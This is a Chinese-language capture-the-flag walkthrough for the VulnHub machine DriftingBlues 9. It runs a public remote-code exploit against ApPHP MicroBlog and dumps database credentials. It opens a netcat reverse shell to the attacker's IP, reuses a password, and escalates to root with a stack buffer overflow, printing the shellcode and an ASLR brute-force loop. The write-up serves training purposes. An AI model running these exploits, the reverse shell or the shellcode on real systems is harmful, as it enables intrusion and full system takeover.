[Site Unreachable](https://grumpygeekwrites.wordpress.com/2021/05/12/driftingblues-9/)

|   |   |   |
|---|---|---|
|driftingblues9|easy|aPphp GETSHELL、searchsploit使用、凭据收集、gdb使用、<br><br>缓冲区溢出漏洞（难）、pattern_create.rb、pattern_offset.rb 使用|

# 主机发现

```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ sudo netdiscover -i eth0 -r 192.168.44.139/24
```
# 服务探测

```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ sudo nmap -sV -A -T 4 -p- 192.168.44.139  

80/tcp    open  http    Apache httpd 2.4.10 ((Debian))

111/tcp   open  rpcbind 2-4 (RPC #100000)
```
# 目录扫描
```c
http://192.168.44.139/README.txt

// ApPHP MicroBlog Free
// Version: 1.0.1
```

# 漏洞扫描
```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ searchsploit apphp                      
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
ApPHP MicroBlog 1.0.1 - Multiple Vulnerabi | php/webapps/33030.txt
ApPHP MicroBlog 1.0.1 - Remote Command Exe | php/webapps/33070.py




┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ searchsploit -m php/webapps/33030.txt  
  Exploit: ApPHP MicroBlog 1.0.1 - Multiple Vulnerabilities
      URL: https://www.exploit-db.com/exploits/33030
     Path: /usr/share/exploitdb/exploits/php/webapps/33030.txt
    Codes: OSVDB-106352, OSVDB-106351
 Verified: True
File Type: ASCII text
Copied to: /home/kali/桌面/OSCP/33030.txt




┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ python2 33070.py http://192.168.44.139/
  -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-
original exploit by Jiko : http://www.exploit-db.com/exploits/33030/
[*] Testing for vulnerability...
[+] Website is vulnerable

[*] Fecthing phpinfo
        PHP Version 5.6.40-0+deb8u12
        System   Linux debian 3.16.0-4-586 #1 Debian 3.16.51-2 (2017-12-03) i686
        Loaded Configuration File   /etc/php5/apache2/php.ini
        Apache Version   Apache/2.4.10 (Debian)
        User/Group   www-data(33)/33
        Server Root   /etc/apache2
        DOCUMENT_ROOT   /var/www/html
        PHP Version   5.6.40-0+deb8u12
        allow_url_fopen  On  On
        allow_url_include  Off  Off
        disable_functions  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,
        open_basedir   no value    no value
        System V Message based IPC   Wez Furlong
        System V Semaphores   Tom May
        System V Shared Memory   Christian Cartus

[*] Fetching include/base.inc.php
<?php
                        // DATABASE CONNECTION INFORMATION
                        define('DATABASE_HOST', 'localhost');           // Database host
                        define('DATABASE_NAME', 'microblog');           // Name of the database to be used
                        define('DATABASE_USERNAME', 'clapton'); // User name for access to database
                        define('DATABASE_PASSWORD', 'yaraklitepe');     // Password for access to database
                        define('DB_ENCRYPT_KEY', 'p52plaiqb8');         // Database encryption key
                        define('DB_PREFIX', 'mb101_');              // Unique prefix of all table names in the database
                        ?>

[*] Testing remote execution
[+] Remote exec is working with system() :)
Submit your commands, type exit to quit
> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

经过一番排查，我们发现用户clapton的密码被重复使用su一下

# 提权
反弹shell
```c
> nc -e /bin/bash 192.168.44.128 9001

┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001

script /dev/null -c bash

su clapton //yaraklitepe
```

```c
clapton@debian:~$ cat note.txt  
cat note.txt
buffer overflow is the way. ( ° ʖ °)

if you're new on 32bit bof then check these:
翻译
缓冲区溢出就是这样。

如果您是 32 位的新手，请检查以下内容：
https://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html
https://samsclass.info/127/proj/lbuf1.htm
  
  
clapton@debian:~$ cat user.txt
cat user.txt
F569AA95FAFF65E7A290AB9ED031E04F
```
上面已经提示了有缓冲区溢出漏洞还给出了教程链接，来学习学习
首先我们先下载靶机里面的input 文件
# PWN
由于此靶机上启用了**ASLR**，为了进行漏洞利用开发，我将此输入二进制文件复制到我的 Kali 中。
```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ cat /proc/sys/kernel/randomize_va_space 
2
```

>ASLR(系统开启的)
ASLR是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。
在linux中使用此技术后，杀死某程序后重新开启，地址换。
在windows中使用此技术后，杀死进程后重新开启，地址不换，重启才会改变。

>以上cat命令输出的值表示：
0 - 表示关闭进程地址空间随机化。
1 - 表示将mmap的基址，stack和vdso页面随机化。
2 - 表示在1的基础上增加栈（heap）的随机化。

我必须先禁用 ASLR，然后在 gdb 中加载二进制文件。

```c
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
gdb -q input
```

生成字符
```c
┌──(kali㉿kali)-[~]
└─$ msf-pattern_create -l 300

┌──(kali㉿kali)-[~]
└─$ cd /usr/share/metasploit-framework/tools/exploit 
                                                                    
┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit]
└─$ ./pattern_create.rb -l 2000
```
gdb调试，得到可以看到在 0x41376641 处得到了分段错误。
```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ gdb -q input
Reading symbols from input...
(No debugging symbols found in input)
(gdb) r    xxxxxxxxxxxxxx好多字符

Program received signal SIGSEGV, Segmentation fault.
0x41376641 in ?? ()
```
现在，我们需要用它来查找偏移量。
接着我们使用 patter_offset.rb 来查找我们可以覆盖 EIP 的字节数。执行后可以看到171字节后可以覆盖EIP。
```c
┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit]
└─$ ./pattern_offset.rb -l 200 -q 0x41376641
[*] Exact match at offset 171

┌──(kali㉿kali)-[~]
└─$ msf-pattern_offset -l 200 -q 0x41376641
[*] Exact match at offset 171

```

Leave等价于：

mov l %ebp %esp

pop l %ebp

我们在 171 处得到了精确匹配。现在，我们可以使用 python 命令简单地创建字符串。例如，输入包含具有 171 个 A、4 个 B 和 500 个 nop 的简单输入。
我们可以使用 gdb 中的参数来进行测试
```c
./input $(python2 -c 'print "A" * 171 + "B" * 4 + "\x90" * 500')
```

```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ gdb -q input
Reading symbols from input...
(No debugging symbols found in input)
(gdb) run $(python2 -c 'print "A"*171 + "B"*4 + "\x90"*500')
Starting program: /home/kali/桌面/OSCP/input $(python2 -c 'print "A"*171 + "B"*4 + "\x90"*500')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/s $esp
0xffffccd0:     '\220' <repeats 200 times>...
(gdb) 
```
之后，我检查了 esp 寄存器，并由于小端字节序而用相反顺序的esp地址(由于此时esp地址存储的是下一跳地址，所以还有一种方法二，这个地址话可以填成jmp esp指令的地址（[VulnHub-driftingblues:9\_driftingblues9-CSDN博客](https://blog.csdn.net/qq_32261191/article/details/117908644)）)替换了 4 个 B。之后，我在 nop sled 之后添加了 shell。我的最终输入如下：

```c
run $(python2 -c 'print "A" * 171 + "\xd0\xcc\xff\xff" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"')

```
我也在目标机器上重复了相同的过程。但是，目标上的 ASLR 已启用，如果没有 root 权限，我们无法禁用它。因此，我们必须多次迭代相同的代码行。
我替换了之前有效负载中的地址并运行了 for 循环
经过两次不同的尝试，我得到了 root shell 和 flag
```c
ldd input //0xb75ba000

for i in {1..10000}; do (./input $(python -c 'print "A" * 171 + "\xa0\xe4\xff\xbf" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"')); done
```

在 CUTTER 中分析了二进制文件。发现数组大小为 171，这是我们的偏移值


#### 前面的是在kali主机上进行的测试，esp的值和靶机里面的esp的值是不同的,下面才是在靶机中进行提取的

0xbffe48a0:
```c
clapton@debian:~$ gdb -q input
(gdb) run $(python2 -c 'print "A"*171 + "B"*4 + "\x90"*500')

(gdb) x/ws $esp
x/ws $esp
0xbffe48a0:     U'\x90909090' <repeats 125 times>

clapton@debian:~$ for i in {1..10000}; do (./input $(python -c 'print "A" * 171 + "\xa0\xe4\xff\xbf" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"')); done
<7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"'));done
```

```css
# cat /root/root.txt
cat /root/root.txt
   
this is the final of driftingblues series. i hope you've learned something from them.

you can always contact me at vault13_escape_service[at]outlook.com for your questions. (mail language: english/turkish)

your root flag:

04D4C1BEC659F1AA15B7AE731CEEDD65

good luck. ( ° ʖ °)

```
在 CUTTER 中分析了二进制文件。发现数组大小为 171，这是我们的偏移值。